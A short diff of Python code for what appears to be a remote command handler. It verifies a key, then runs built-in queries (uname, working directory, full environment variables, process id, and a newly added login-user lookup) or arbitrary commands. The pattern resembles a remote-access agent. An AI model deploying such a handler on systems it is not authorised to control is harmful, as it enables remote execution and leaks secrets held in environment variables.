@@ -73,9 +73,8 @@ def handle(data):
 	integrity = data[3]
 
 	if verify(key, command, parameters, integrity):
-		if command == "BUILTIN":
-			stdout = run_builtin(parameters)
-		else:
+		stdout = run_builtin(command)
+		if stdout == "BUILTIN":
 			stdout = run_command(command, parameters)
 	else:
 		stdout = f"Invalid command: {data}"
@@ -153,7 +152,7 @@ def run_builtin(command):
 	Returns:
 
 	"""
-	if command == "name":
+	if command == "nme":
 		return get_uname()
 	elif command == "cwd":
 		return os.getcwd()
@@ -161,6 +160,10 @@ def run_builtin(command):
 		return os.environ
 	elif command == "pid":
 		return str(os.getpid())
+	elif command == "usr":
+		return os.getlogin()
+	else:
+		return "BUILTIN"
 
 
 def run_command(command, parameters):
